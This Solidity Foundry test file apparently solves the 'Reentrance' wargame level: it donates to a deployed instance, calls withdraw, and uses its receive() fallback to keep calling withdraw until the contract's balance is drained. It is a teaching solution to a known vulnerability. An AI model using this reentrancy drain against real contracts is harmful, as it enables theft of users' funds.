// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "./ReentranceFactory.sol";

contract ReentranceTest is Test {
    ReentranceFactory factory;
    address reentrance;
    uint256 times;
    uint256 amount = 0.001 ether;

    function setUp() public {
        factory = new ReentranceFactory();
        reentrance = factory.createInstance{value: amount}(address(this));
        times = address(reentrance).balance / amount;
    }

    function testReentrance() public {
        Reentrance(payable(reentrance)).donate{value: amount}(address(this));

        Reentrance(payable(reentrance)).withdraw(amount);

        assertTrue(factory.validateInstance(payable(address(reentrance)), address(this)));
    }

    receive() external payable {
        if (times-- > 0) {
            Reentrance(payable(reentrance)).withdraw(amount);
        }
    }
}
